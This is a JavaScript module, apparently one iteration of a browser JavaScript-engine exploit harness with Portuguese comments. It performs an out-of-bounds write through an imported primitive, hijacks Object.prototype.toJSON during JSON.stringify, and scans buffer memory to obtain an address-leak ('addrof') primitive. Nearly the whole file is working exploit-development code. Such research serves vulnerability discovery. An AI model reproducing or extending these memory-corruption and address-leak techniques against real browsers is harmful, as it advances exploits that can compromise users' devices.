// js/script3/testArrayBufferVictimCrash.mjs (v75_CorruptAndFuzzTargets)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
// import { JSC_OFFSETS } from '../config.mjs'; // Não usado ativamente em v75

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V75_CAFT = "OriginalHeisenbug_TypedArrayAddrof_v75_CorruptAndFuzzTargets";

// Variáveis globais ao módulo
let captured_fuzz_reads_for_AB_v75 = null;
let captured_fuzz_reads_for_DV_v75 = null;

let leak_target_buffer_v75 = null; // Alvo do addrof/fuzz - um ArrayBuffer
let leak_target_dataview_v75 = null; // Alvo do addrof/fuzz - um DataView
let victim_typed_array_ref_v75 = null; // O Uint8Array inicial para iniciar o JSON.stringify
let first_call_details_object_ref_v75 = null; // Detalhes da Call #1, que retorna o objeto contendo os alvos
let probe_call_count_v75 = 0;
let all_probe_interaction_details_v75 = []; // Array para armazenar os current_call_details

const VICTIM_BUFFER_SIZE = 256; // Tamanho do buffer do Uint8Array vítima
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C; // O gatilho OOB principal
const OOB_WRITE_VALUE = 0xFFFFFFFF; // Valor para a escrita OOB principal
const PROBE_CALL_LIMIT_V75 = 10; 
const FUZZ_READ_OFFSETS_V75 = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30]; 


function toJSON_TA_Probe_CorruptAndFuzz_v75() {
    probe_call_count_v75++;
    const call_num = probe_call_count_v75;
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V75_CAFT,
        this_type: Object.prototype.toString.call(this),
        this_is_victim_typed_array: (this === victim_typed_array_ref_v75),
        this_is_C1_details: (this === first_call_details_object_ref_v75 && first_call_details_object_ref_v75 !== null),
        this_is_leak_target_AB: (this === leak_target_buffer_v75 && leak_target_buffer_v75 !== null),
        this_is_leak_target_DV: (this === leak_target_dataview_v75 && leak_target_dataview_v75 !== null),
        target_interaction_status: "No interaction yet",
        fuzz_capture_status: null,
        error_in_probe: null
    };
    logS3(`[PROBE_V75] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictimTA? ${current_call_details.this_is_victim_typed_array}. IsC1? ${current_call_details.this_is_C1_details}. IsLeakAB? ${current_call_details.this_is_leak_target_AB}. IsLeakDV? ${current_call_details.this_is_leak_target_DV}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V75) { all_probe_interaction_details_v75.push({...current_call_details}); return { recursion_stopped_v75: true }; }

        if (call_num === 1 && current_call_details.this_is_victim_typed_array) {
            logS3(`[PROBE_V75] Call #${call_num}: 'this' is victim_typed_array. Creating C1_details object.`, "info");
            first_call_details_object_ref_v75 = { 
                call_number_when_created: call_num,
                payload_AB_ref: leak_target_buffer_v75, // Referência direta
                payload_DV_ref: leak_target_dataview_v75  // Referência direta
            };
            all_probe_interaction_details_v75.push({...current_call_details});
            return first_call_details_object_ref_v75; 
        } 
        else if (current_call_details.this_is_leak_target_AB || current_call_details.this_is_leak_target_DV) {
            const target_name = current_call_details.this_is_leak_target_AB ? "ArrayBufferLeakTarget" : "DataViewLeakTarget";
            logS3(`[PROBE_V75] Call #${call_num}: 'this' IS THE ${target_name}! Original type: ${current_call_details.this_type}. Attempting property writes...`, "critical");
            
            try {
                this[0] = victim_typed_array_ref_v75; // Tentar escrever um objeto
                this[1] = 0x11223344;               // Tentar escrever um número
                this.test_property_on_target = "SetInProbe";
                current_call_details.target_interaction_status = `Properties set on ${target_name} ('this'). Keys: ${Object.keys(this).join(',')}`;
                logS3(`[PROBE_V75]   ${current_call_details.target_interaction_status}`, "info");
            } catch (e_set) {
                current_call_details.target_interaction_status = `Error setting props on ${target_name} ('this'): ${e_set.message}`;
                logS3(`[PROBE_V75]   ${current_call_details.target_interaction_status}`, "error");
            }

            // FUZZING DE LEITURA IMEDIATAMENTE APÓS TENTATIVA DE ESCRITA/CORRUPÇÃO
            let fuzzed_reads = [];
            try {
                let view_on_this = new DataView(this instanceof ArrayBuffer ? this : this.buffer); 
                for (const offset of FUZZ_READ_OFFSETS_V75) {
                    let low=0,high=0,ptr_str="N/A",dbl=NaN,err_msg=null; if(view_on_this.byteLength<(offset+8)){err_msg="OOB";}else{low=view_on_this.getUint32(offset,true);high=view_on_this.getUint32(offset+4,true);ptr_str=new AdvancedInt64(low,high).toString(true);let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high;dbl=(new Float64Array(tb))[0];} fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg});
                }
                current_call_details.fuzz_capture_status = `${target_name} Fuzz captured ${fuzzed_reads.length} reads after interaction.`;
                if (current_call_details.this_is_leak_target_AB) captured_fuzz_reads_for_AB_v75 = fuzzed_reads;
                else if (current_call_details.this_is_leak_target_DV) captured_fuzz_reads_for_DV_v75 = fuzzed_reads;
                logS3(`[PROBE_V75]   ${current_call_details.fuzz_capture_status} (First read: ${fuzzed_reads[0]?.int64 || 'N/A'})`, "vuln");
            } catch (e) { current_call_details.error_in_probe = (current_call_details.error_in_probe || "") + ` FuzzReadErr: ${e.message};`; }
            
            all_probe_interaction_details_v75.push({...current_call_details});
            return { marker_fuzz_done_v75: true, target: target_name, call_num_processed: call_num };
        }
        // ... (outros casos de 'this', retorno genérico) ...
    } catch (e_probe_outer) { current_call_details.error_in_probe = (current_call_details.error_in_probe || "") + ` OuterProbeErr: ${e_probe_outer.message};`; }
    all_probe_interaction_details_v75.push({...current_call_details});
    return `GenericReturn_Call${call_num}`;
}


export async function executeTypedArrayVictimAddrofTest_CorruptAndFuzzTargets() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V75_CAFT}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (CorruptAndFuzzTargets) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V75_CAFT} Init...`;

    // Reset das variáveis globais do módulo
    captured_fuzz_reads_for_AB_v75 = null; captured_fuzz_reads_for_DV_v75 = null;
    probe_call_count_v75 = 0; all_probe_interaction_details_v75 = [];
    victim_typed_array_ref_v75 = null; first_call_details_object_ref_v75 = null;
    
    leak_target_buffer_v75 = new ArrayBuffer(0x80); 
    leak_target_dataview_v75 = new DataView(new ArrayBuffer(0x80)); 

    let errorCapturedMain = null;
    let rawStringifyOutput = "N/A", stringifyOutput_parsed = null;
    let addrof_A_result = { success: false, msg: "Addrof ABTarget Fuzz: Default" };
    let addrof_B_result = { success: false, msg: "Addrof DVTarget Fuzz: Default" };
    let pollutionApplied = false, originalToJSONDescriptor = null;
    const fillPatternLeakTargets = 0xABABABAB; // Padrão diferente para os alvos de leak

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write done.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v75 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        // Preencher os buffers alvo
        let temp_view_ab = new Uint32Array(leak_target_buffer_v75);
        for(let i=0; i < temp_view_ab.length; i++) temp_view_ab[i] = fillPatternLeakTargets + i;
        
        let temp_view_dv = new Uint32Array(leak_target_dataview_v75.buffer);
        for(let i=0; i < temp_view_dv.length; i++) temp_view_dv[i] = fillPatternLeakTargets + 0xA0A0 + i;

        logS3(`STEP 2: Victim and Leak Target AB/DV created and filled.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_CorruptAndFuzz_v75, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v75);
            logS3(`  JSON.stringify completed. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try{ stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch(e){ stringifyOutput_parsed = {parse_error: e.message, raw: rawStringifyOutput};}

            logS3("STEP 3: Analyzing fuzz data from side-channels (v75)...", "warn", FNAME_CURRENT_TEST);
            let targetReachedAndFuzzed = false; 

            const process_fuzz_data = (fuzzed_reads_array, target_addrof_result, objTypeName) => {
                 if (fuzzed_reads_array && Array.isArray(fuzzed_reads_array)) {
                    targetReachedAndFuzzed = true; 
                    logS3(`  V75_ANALYSIS: Processing ${fuzzed_reads_array.length} captured fuzz reads for ${objTypeName}.`, "good");
                    let found_ptr = false;
                    for (const read_attempt of fuzzed_reads_array) {
                        if (read_attempt.error) continue;
                        const highVal = parseInt(read_attempt.high, 16);
                        const lowVal = parseInt(read_attempt.low, 16);
                        
                        let isPotentialPtr = false;
                        // Ajustar heurística de ponteiro se necessário
                        if ((highVal !== 0 || lowVal !== 0) && 
                            !((highVal === 0xDEADBEEF || highVal === 0xCAFEBABE || highVal === (fillPatternLeakTargets >> 16)) && (lowVal === 0xDEADBEEF || lowVal === 0xCAFEBABE || lowVal === (fillPatternLeakTargets & 0xFFFF) ) ) && // Ignora fill patterns
                            (highVal < 0x000F0000) && 
                            !isNaN(read_attempt.dbl) 
                           ) {
                             if (highVal >= 0x00000008 && highVal < 0x0000000E ) { isPotentialPtr = true;
                             } else if (lowVal > 0x100000 && (lowVal & 0x7) === 0 && highVal < 0x7FF0 ) { isPotentialPtr = true; } // Evita NaN/Infinity
                        }

                        if(isPotentialPtr){
                            target_addrof_result.success = true;
                            target_addrof_result.msg = `V75 SUCCESS (${objTypeName} Fuzz): Potential Ptr ${read_attempt.int64} @${read_attempt.offset}`;
                            logS3(`  !!!! V75 POTENTIAL POINTER for ${objTypeName} @${read_attempt.offset}: ${read_attempt.int64} (Dbl: ${read_attempt.dbl}) !!!!`, "vuln");
                            found_ptr = true; break; 
                        }
                    }
                    if(!found_ptr){ target_addrof_result.msg = `V75 Fuzz for ${objTypeName}: No clear pointer. First read: ${fuzzed_reads_array[0]?.int64 || 'N/A'}`; }
                } else if (!target_addrof_result.success) { target_addrof_result.msg = `V75 No fuzz data in side-channel for ${objTypeName}.`; }
            };

            process_fuzz_data(captured_fuzz_reads_for_AB_v75, addrof_A_result, "ArrayBufferTarget");
            process_fuzz_data(captured_fuzz_reads_for_DV_v75, addrof_B_result, "DataViewTarget");
            
            if(addrof_A_result.success||addrof_B_result.success){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V75_CAFT}: Addr SUCCESS!`;}
            else if(targetReachedAndFuzzed){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V75_CAFT}: Target Reached & Fuzzed, Addr Fail`;}
            else{document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V75_CAFT}: No Target Reached?`;}

        } catch (e) { errorCapturedMain = e; document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V75_CAFT}: InnerCatch ERR: ${e.name}`;
        } finally { if (pollutionApplied) { if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];} }
    } catch (e) { errorCapturedMain = e; document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V75_CAFT}: OuterCatch ERR: ${e.name}`; }
    finally {
        let last_probe_details_for_return = null;
        if (all_probe_interaction_details_v75 && Array.isArray(all_probe_interaction_details_v75) && all_probe_interaction_details_v75.length > 0) {
           try { last_probe_details_for_return = JSON.parse(JSON.stringify(all_probe_interaction_details_v75[all_probe_interaction_details_v75.length-1])); } catch(e_ser) {last_probe_details_for_return = {serialization_error: e_ser.message, last_call_num: probe_call_count_v75 };}
        }
        
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v75}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof AB Target: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof DV Target: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v75 = null; all_probe_interaction_details_v75 = []; probe_call_count_v75 = 0; first_call_details_object_ref_v75 = null; leak_target_buffer_v75 = null; leak_target_dataview_v75 = null; captured_fuzz_reads_for_AB_v75 = null; captured_fuzz_reads_for_DV_v75 = null;
   
        return {
            errorCapturedMain: errorCapturedMain, stringifyResult: stringifyOutput_parsed, 
            toJSON_details: last_probe_details_for_return,
            all_probe_calls_for_analysis: all_probe_interaction_details_v75.map(d=>({...d})), 
            total_probe_calls: probe_call_count_v75, // Este será 0 aqui devido ao reset
            addrof_A_result: addrof_A_result, addrof_B_result: addrof_B_result
        };
    }
};
